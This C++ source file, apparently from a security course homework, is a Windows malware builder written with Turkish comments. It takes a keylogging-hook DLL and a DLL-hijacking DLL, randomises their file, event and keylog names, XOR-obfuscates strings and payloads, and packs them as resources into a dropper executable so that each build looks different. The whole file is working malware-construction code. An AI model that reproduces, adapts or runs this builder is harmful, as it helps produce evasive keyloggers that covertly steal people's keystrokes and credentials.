#include "../BGM532_HW2/Header.h"
#include <stdio.h>
#include <time.h>

// kullan�lan dosya isimleri ve PATH leri
TCHAR szInjectedDllName[] = TEXT("kloc.dll");//keylogging hook i�eren dll
TCHAR szInjectedDllPath[MAX_PATH] = TEXT("");
TCHAR szHijackedDllName[] = TEXT("toul.dll");//dll hijacking
TCHAR szHijackedDllPath[MAX_PATH] = TEXT("");
TCHAR szSrcExename_[] = TEXT("ktol.exe");
TCHAR szSrcExename[MAX_PATH] = TEXT("");
TCHAR szDscExename_[] = TEXT("ktolNew.exe");// TEXT("ketol.exe");
TCHAR szDscExename[MAX_PATH] = TEXT("");

// olmas� istenen (kontrol edilecek olan) rasgele �retilecek dosya ismi
CHAR szWantedExeName[] = EXENAME;
// rasgele �retilecek inject edilecek dll ismi
TCHAR szInjectDllName[] = HOOK_DLL;
CHAR szEventName[] = EVENTNAME; //bu search edilip de�i�tirilecek
// keylogging hangi dosyaya yap�lacak:
CHAR szLogFile[] = KEYLOGFILE;

// rsc dosyalar�n� �ifrelemek i�in key
CHAR szTablo[21] = RSCKEY;

// EXE dosyas�n �ifrelenecek katarlar�
PCTSTR katarlar[] = {SUBKEY, KEYVALUE, ADOBEURL, ADOBEEXE, PATHENVVAR, EXTRAPATH};

// fonksiyonlar�m�z
PCHAR DosyaOku(PTSTR szFileName, PDWORD pdwFizeSize);
void XorEncode(PBYTE pbVeri, DWORD dwSize, PBYTE bSifre, DWORD dwSifreSize);
PTSTR XorEncodeBsc(PCTSTR szVeri);
BOOL ChangeStr(PBYTE pbVeri, DWORD dwSize, PCHAR szOld, PCHAR szNew);
BOOL ChangeStrW(PBYTE pbVeri, DWORD dwSize, PCTSTR szOld, PTCHAR szNew);
BOOL ChangeByteSeq(PBYTE pbVeri, DWORD dwVeriSize, PBYTE bOld, PBYTE bNew, DWORD dwLen);
BOOL ChangeDosyaStr(PTSTR szFileName, PDWORD pdwFizeSize, PCHAR szOld, PCHAR szNew);
BOOL DosyaYaz(PTSTR lpszFileName, LPVOID lpData, DWORD dwSize);
void GetRandomCharSeq(PCHAR szData, DWORD dwSize);
void GetRandomWCharSeq(PWCHAR szData, DWORD dwLen);

void _tmain(int argc, TCHAR* argv[]) {
	//BYTE bXorByte = 0;
	PVOID pInjectedDllVeri = NULL, pHijackedDllVeri = NULL, pExeFileVeri = NULL;
	DWORD dwInjectedVeriSize = 0, dwHijackedDllVeriSize = 0, pExeFileVeriSize = 0;
	HANDLE hRsrc = NULL;

	//�al��t�r�ld��� PATH i bulma
	TCHAR szPath[MAX_PATH];
	GetModuleFileName(NULL, szPath, MAX_PATH);
	PTCHAR szProcessName = wcsrchr(szPath, L'\\') + 1;
	*szProcessName = 0;

	//kullan�lan dosyalar�n FULL path ini bul
	StringCbCopy(szInjectedDllPath, MAX_PATH, szPath);
	StringCbCat(szInjectedDllPath, MAX_PATH, szInjectedDllName);

	StringCbCopy(szHijackedDllPath, MAX_PATH, szPath);
	StringCbCat(szHijackedDllPath, MAX_PATH, szHijackedDllName);

	StringCbCopy(szSrcExename, MAX_PATH, szPath);
	StringCbCat(szSrcExename, MAX_PATH, szSrcExename_);

	StringCbCopy(szDscExename, MAX_PATH, szPath);
	StringCbCat(szDscExename, MAX_PATH, szDscExename_);

	//random verilerimizi �retelim
	srand((unsigned)GetTickCount());
	GetRandomCharSeq(szTablo, strlen(szTablo));
	GetRandomCharSeq(szWantedExeName, strlen(szWantedExeName) - 4); // sonunda ".exe" olmas� i�in "-4"
	GetRandomWCharSeq(szInjectDllName, lstrlenW(szInjectDllName) - 4); // sonunda ".dll" olmas� i�in "-4"

	//kaynak exe dosyas�n� oku	
	pExeFileVeri = DosyaOku(szSrcExename, &pExeFileVeriSize);
	//	if (!ChangeDosyaStr(szExename, &dwSize3, TABLO, szTablo))
	if (pExeFileVeriSize == 0) {
		_tprintf(_T("Kaynak exe dosyadan (%s) okuma basarisiz oldu.\n"), szSrcExename);
		goto temizle;
	}

	PTSTR szTemp = NULL;

	for (auto szKatar : katarlar) {
		// encode et
		szTemp = XorEncodeBsc(szKatar);
		// bul de�i�tir		
		if (!ChangeByteSeq((PBYTE)pExeFileVeri, pExeFileVeriSize, (PBYTE)szKatar, PBYTE(szTemp), lstrlenW(szKatar) * 2)) {
			_tprintf(_T("Kaynak exe dosya ChangeStrW(%s, %s) basarisiz oldu.\n"), szKatar, szTemp);
		}
		// bo�altki bir daha kullan�ls�n
		free(szTemp);
	}

	// HOOK_DLL key i de�i�tir
	if (!ChangeStrW((PBYTE)pExeFileVeri, pExeFileVeriSize, HOOK_DLL, szInjectDllName)) {
		_tprintf(_T("Kaynak exe dosya ChangeStrW(%s) basarisiz oldu.\n"), HOOK_DLL);
		goto temizle;
	}

	// rsc key i de�i�tir
	if (!ChangeStr((PBYTE)pExeFileVeri, pExeFileVeriSize, RSCKEY, szTablo)) {
		printf("Kaynak exe dosya ChangeStr(%s) basarisiz oldu.\n", RSCKEY);
		goto temizle;
	}

	// rasgele wanted exe ismini de�i�tir
	if (!ChangeStr((PBYTE)pExeFileVeri, pExeFileVeriSize, EXENAME, szWantedExeName)) {
		printf("Kaynak exe dosya ChangeStr(%s) basarisiz oldu.\n", EXENAME);
		goto temizle;
	}

	if (!DosyaYaz(szDscExename, pExeFileVeri, pExeFileVeriSize)) {
		_tprintf(_T("Hedef exe dosya (%s) yazma basarisiz oldu.\n"), szDscExename);
		goto temizle;
	}

	//kaynak dd lerden verileri oku
	// DWORD  dwSize1 = 0;
	pInjectedDllVeri = DosyaOku(szInjectedDllPath, &dwInjectedVeriSize);
	if (dwInjectedVeriSize == 0) {
		_tprintf(_T("Injected dll dosyas�ndan veri okuma basarisiz oldu: %s.\n"), szInjectedDllPath);
		goto temizle;
	}

	// DWORD  dwSize2 = 0;
	pHijackedDllVeri = DosyaOku(szHijackedDllPath, &dwHijackedDllVeriSize);
	if (dwHijackedDllVeriSize == 0) {
		_tprintf(_T("Hijacked dll dosyas�ndan veri okuma basarisiz oldu: %s.\n"), szHijackedDllPath);
		goto temizle;
	}

	//hedef dosyada update i�lemini ba�lat
	hRsrc = BeginUpdateResource(szDscExename, TRUE);

	if (hRsrc == NULL) {
		_tprintf(_T("BeginUpdateResource %s hata: %x \n"), szDscExename, GetLastError());
		goto temizle;
	}

#ifdef _DEBUG
	_tprintf(_T("BeginUpdateResource %s basarili.\n"), szDscExename);
#endif
	/*CHAR szEventName[] = EVENTNAME; //bu search edilip de�i�tirilecek
	// keylogging hangi dosyaya yap�lacak:
	CHAR szLogFile[] = KEYLOGFILE;*/
	GetRandomCharSeq(szEventName, strlen(szEventName));
	GetRandomCharSeq(szLogFile, strlen(szLogFile));

	// injected dll i�indeki keylogging kay�tlar�n�n tutulaca�� dosya ismini de�i�tir
	if (!ChangeStr((PBYTE)pInjectedDllVeri, dwInjectedVeriSize, KEYLOGFILE, szLogFile)) {
		printf("Injected dll dosyas� ChangeStr(%s) basarisiz oldu.\n", KEYLOGFILE);
		goto temizle;
	}

	// hijacked dll i�indeki injected dll ismini de�i�tir
	if (!ChangeStrW((PBYTE)pHijackedDllVeri, dwHijackedDllVeriSize, HOOK_DLL, szInjectDllName)) {
		_tprintf(_T("Hijecked dll dosyas� ChangeStrW(%s) basarisiz oldu.\n"), HOOK_DLL);
		goto temizle;
	}
	//"MyEvent" kayd�n bul ve de�i�tir
	if (!ChangeStr((PBYTE)pInjectedDllVeri, dwInjectedVeriSize, EVENTNAME, szEventName)) {
		printf("Injected dll dosyas� ChangeStr(%s) basarisiz oldu.\n", EVENTNAME);
		goto temizle;
	}

	if (!ChangeStr((PBYTE)pHijackedDllVeri, dwHijackedDllVeriSize, EVENTNAME, szEventName)) {
		printf("Hijacked dll dosyas� ChangeStr(%s) basarisiz oldu.\n", EVENTNAME);
		goto temizle;
	}
	//encode et
	XorEncode((LPBYTE)pInjectedDllVeri, dwInjectedVeriSize, (PBYTE)szTablo, strlen(szTablo) - 10);
	XorEncode((LPBYTE)pHijackedDllVeri, dwHijackedDllVeriSize, (PBYTE)szTablo + 10, strlen(szTablo) - 10);

	//LPCTSTR szRsrcName = _T("denmee");
	//CHAR * veri = "Merhaba millet";
	WORD index = 0;
	if (!UpdateResource(hRsrc, RT_RCDATA, MAKEINTRESOURCE(index++), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), pInjectedDllVeri, dwInjectedVeriSize)) {
		_tprintf(_T("pInjectedDllVeri UpdateResource hata: %x \n"), GetLastError());
		goto temizle;
	}

	if (!UpdateResource(hRsrc, RT_RCDATA, MAKEINTRESOURCE(index++), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), pHijackedDllVeri, dwHijackedDllVeriSize)) {
		_tprintf(_T("pHijackedDllVeri UpdateResource hata: %x \n"), GetLastError());
		goto temizle;
	}
	// Write changes to EXE file and then close it.
	if (!EndUpdateResource(hRsrc, FALSE)) {
		_tprintf(TEXT("Could not write resource changes to file."));
		goto temizle;
	}

	//_tprintf(_T("KaynakDosya ekleme islemi basarili oldu.\n"));
	//bXorByte //szTablo
	/*CHAR szWantedExeName[] = EXENAME;
// rasgele �retilecek inject edilecek dll ismi
TCHAR szInjectDllName[] = HOOK_DLL;
CHAR szEventName[] = EVENTNAME; //bu search edilip de�i�tirilecek
// keylogging hangi dosyaya yap�lacak:
CHAR szLogFile[] = KEYLOGFILE;*/
	printf("TABLO: %s\tEXENAME: %s\tEVENTNAME: %s\tKEYLOGFILE: %s", szTablo, szWantedExeName, szEventName, szLogFile);
	_tprintf(L"\tDLLNAME: %s", szInjectDllName);

temizle:
	free(pInjectedDllVeri);
	free(pHijackedDllVeri);
	free(pExeFileVeri);
	//if (hRsrc != NULL) free(hRsrc);	
	return;
}

PCHAR DosyaOku(PTSTR szFileName, PDWORD pdwFizeSize) {
	DWORD dwStatus = 0;
	BOOL bResult = FALSE;
	HANDLE hFile = NULL;
	DWORD cbRead = 0;
	LARGE_INTEGER fileSize;
	PCHAR veri = NULL;

	hFile = CreateFile(szFileName,
	                   GENERIC_READ,
	                   FILE_SHARE_READ,
	                   NULL,
	                   OPEN_EXISTING,
	                   FILE_FLAG_SEQUENTIAL_SCAN,
	                   NULL);

	if (INVALID_HANDLE_VALUE == hFile) {
		dwStatus = GetLastError();
		_tprintf(_T("Error opening file %s\nError: %d\n"), szFileName,
		         dwStatus);
		goto Temizle;
	}

	if (!GetFileSizeEx(hFile, &fileSize)) {
		dwStatus = GetLastError();
		_tprintf(_T("Error GetFileSizeEx %s\nError: %d\n"), szFileName, dwStatus);
		goto Temizle;
	}

	*pdwFizeSize = fileSize.LowPart;
	veri = (PCHAR)malloc(fileSize.LowPart);


	if (!ReadFile(hFile, veri, fileSize.LowPart, &cbRead, NULL)) {
		dwStatus = GetLastError();
		printf("ReadFile failed: %d\n", dwStatus);
		goto Temizle;
	}

Temizle:
	if (hFile != NULL)
		CloseHandle(hFile);

	return veri;
}

BOOL ChangeDosyaStr(PTSTR szFileName, PDWORD pdwFizeSize, PCHAR szOld, PCHAR szNew) {
	DWORD dwStatus = 0;
	BOOL bResult = FALSE;
	HANDLE hFile = NULL;
	//DWORD cbRead = 0;
	LARGE_INTEGER fileSize;
	//PCHAR veri = NULL;
	HANDLE myFileMapping = NULL;
	LPVOID myAdr = NULL;
	BOOL bSuccess = FALSE;

	hFile = CreateFile(szFileName,
	                   GENERIC_READ | GENERIC_WRITE,
	                   FILE_SHARE_READ,
	                   NULL,
	                   OPEN_EXISTING,
	                   FILE_FLAG_SEQUENTIAL_SCAN,
	                   NULL);

	if (INVALID_HANDLE_VALUE == hFile) {
		dwStatus = GetLastError();
		_tprintf(_T("Error opening file %s\nError: %d\n"), szFileName,
		         dwStatus);
		goto Temizle;
	}

	if (!GetFileSizeEx(hFile, &fileSize)) {
		dwStatus = GetLastError();
		_tprintf(_T("Error GetFileSizeEx %s\nError: %d\n"), szFileName, dwStatus);
		goto Temizle;
	}

	*pdwFizeSize = fileSize.LowPart;
	//veya 
	// DWORD dwFileSize = GetFileSize(hFile,NULL); //da i� g�r�r

	myFileMapping = CreateFileMapping(
		hFile, //_In_      HANDLE hFile,
		NULL, //_In_opt_  LPSECURITY_ATTRIBUTES lpAttributes,
		PAGE_READWRITE, //DWORD flProtect,
		NULL, //_In_      DWORD dwMaximumSizeHigh
		NULL, //_In_      DWORD dwMaximumSizeLow,
		NULL //_In_opt_  LPCTSTR lpName
	);

	if (myFileMapping == NULL) {
		dwStatus = GetLastError();
		_tprintf(_T("CreateFileMapping for file: %s\nError: %d\n"), szFileName, dwStatus);
		goto Temizle;
	}

	myAdr = MapViewOfFile(
		myFileMapping, //_In_  HANDLE hFileMappingObject,
		FILE_MAP_ALL_ACCESS, //_In_  DWORD dwDesiredAccess,
		0, //_In_  DWORD dwFileOffsetHigh,
		0, //_In_  DWORD dwFileOffsetLow,  
		*pdwFizeSize //_In_  SIZE_T dwNumberOfBytesToMap
	);

	if (myAdr == NULL) {
		dwStatus = GetLastError();
		_tprintf(_T("MapViewOfFile for file: %s\nError: %d\n"), szFileName, dwStatus);
		goto Temizle;
	}

	//	printf("adres: 0x%x\n", myAdr);

	//	getchar();
	if (ChangeStr((PBYTE)myAdr, *pdwFizeSize, szOld, szNew))
		bSuccess = TRUE;

Temizle:
	if (myAdr)
		UnmapViewOfFile(myAdr);
	if (myFileMapping)
		CloseHandle(myFileMapping);
	if (hFile != NULL)
		CloseHandle(hFile);

	return bSuccess;
}

void XorEncode(PBYTE pbVeri, DWORD dwSize, PBYTE bSifre, DWORD dwSifreSize) {
	for (DWORD i = 0; i < dwSize; i++)
		if (pbVeri[i] != 0 && pbVeri[i] != bSifre[i % dwSifreSize])
			pbVeri[i] = pbVeri[i] ^ bSifre[i % dwSifreSize];
}

// sadece encode i�lemi i�in
PTSTR XorEncodeBsc(PCTSTR szVeri) {
	int i = 0;
	DWORD dwSize = (lstrlen(szVeri) + 1) * sizeof(TCHAR);
	//gelen veri de en az iki karakter olsun...
	if (dwSize < sizeof(TCHAR) * 3)
		return NULL;

	PTSTR szResult = (PTSTR)malloc(dwSize);
	ZeroMemory(szResult, dwSize);

	szResult[0] = szVeri[0] ^ 0xFF;

	//TCHAR sifre = (szResult[0] > 0xFF / 2) ? szResult[0] : szVeri[0];
	TCHAR sifre = szVeri[0]; // sadece encode i�lemi i�in

	while (szVeri[++i] != 0)
		szResult[i] = szVeri[i] ^ sifre;

	return szResult;
}

BOOL ChangeStr(PBYTE pbVeri, DWORD dwSize, PCHAR szOld, PCHAR szNew) {
	PCHAR szTempName = NULL;//strstr(PCHAR(pbVeri), szOld);
	//BOOL bFound = FALSE;
	DWORD dwLen = strlen(szOld);

	if (dwLen > strlen(szNew)) {
		printf("ChangeStr HATA!: Eski katar yeni katardan daha uzun.\n");
		return FALSE;
	}

	for (DWORD i = 0; i < dwSize; i++) {
		//bFound = FALSE;
		for (DWORD m = 0; m < dwLen; m++) {
			if (*(pbVeri + i + m) != szOld[m]) break;
			else if (m == dwLen - 1) {
				//bFound = TRUE;
				szTempName = (PCHAR)(pbVeri + i);
				goto found;
			}
		}
	}

	printf("ChangeStr HATA!: Eski katar bulunamadi.\n");
	return FALSE;

found:

	/*if (szTempName == NULL){
		_tprintf(_T("�lk kaynak dosya i�in wcsstr basarisiz oldu.\n"));
		return FALSE;
	}*/

	//DWORD szTempSize = strlen(szOld);
	memcpy_s(szTempName, dwLen + 1, szNew, dwLen);

	return TRUE;
}

BOOL ChangeStrW(PBYTE pbVeri, DWORD dwSize, PCTSTR szOld, PTCHAR szNew) {
	PVOID szTempName = NULL;//strstr(PCHAR(pbVeri), szOld);
	//BOOL bFound = FALSE;
	DWORD dwLen = lstrlen(szOld) * 2;

	if (dwLen > lstrlen(szNew) * 2) {
		printf("ChangeStrW HATA!: Eski katar yeni katardan daha uzun.\n");
		return FALSE;
	}

	for (DWORD i = 0; i < dwSize; i++) {
		//bFound = FALSE;
		for (DWORD m = 0; m < dwLen; m++) {
			if (*(pbVeri + i + m) != PBYTE(szOld)[m]) break;
			else if (m == dwLen - 1) {
				//bFound = TRUE;
				szTempName = (PBYTE(pbVeri) + i);
				goto found;
			}
		}
	}

	_tprintf(L"ChangeStrW HATA!: Eski katar bulunamadi: %s.\n", szOld);
	return FALSE;

found:

	memcpy_s(szTempName, dwLen + 1, szNew, dwLen);

	return TRUE;
}

BOOL ChangeByteSeq(PBYTE pbVeri, DWORD dwVeriSize, PBYTE bOld, PBYTE bNew, DWORD dwLen) {
	PBYTE pTempAdr = NULL;
	DWORD m, i;

	for (i = 0; i < dwVeriSize; i++) {
		for (m = 0; m < dwLen; m++) {
			if (*(pbVeri + i + m) != bOld[m]) break;
		}

		if (m == dwLen) {
			pTempAdr = pbVeri + i;
			break;
		}
	}

	if (pTempAdr == NULL) {
		printf("ChangeByteSeq HATA!: Byte Seq bulunamadi!\n");
		return FALSE;
	}

	memcpy_s(pTempAdr, dwLen, bNew, dwLen);

	return TRUE;
}

BOOL DosyaYaz(PTSTR szFileName, LPVOID lpData, DWORD dwSize) {
	HANDLE hLibFile = NULL;
	BOOL bSuccess = FALSE;
	//DWORD err = 0;

	//yeni dosyay� olu�tur //FILE_ATTRIBUTE_SYSTEM biraz daha sakl� olmas� i�in
	hLibFile = CreateFile(szFileName, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hLibFile == INVALID_HANDLE_VALUE) {
		//err = GetLastError();
		return FALSE;
	}

	DWORD dwWritten = 0;
	if (!WriteFile(hLibFile, lpData, dwSize, &dwWritten, NULL) || dwSize != dwWritten) {
		//err = GetLastError();
		goto temizle;
	}

	bSuccess = TRUE;

temizle:
	if (hLibFile) CloseHandle(hLibFile);

	return bSuccess;
}

void GetRandomCharSeq(PCHAR szData, DWORD dwSize) {
	const char myBasis_64[] =
		"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-";
	/* initialize random seed: */
	//srand((unsigned)time(NULL));
	DWORD dwLen = strlen(myBasis_64);

	for (DWORD i = 0; i < dwSize; i++) {
		szData[i] = myBasis_64[rand() % dwLen];
	}

	return;
}

void GetRandomWCharSeq(PWCHAR szData, DWORD dwLen) {
	const WCHAR myBasis_64[] =
		L"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-";
	/* initialize random seed: */
	//srand((unsigned)time(NULL));
	DWORD dwBasisLen = lstrlenW(myBasis_64);

	for (DWORD i = 0; i < dwLen; i++) {
		szData[i] = myBasis_64[rand() % dwBasisLen];
	}

	return;
}
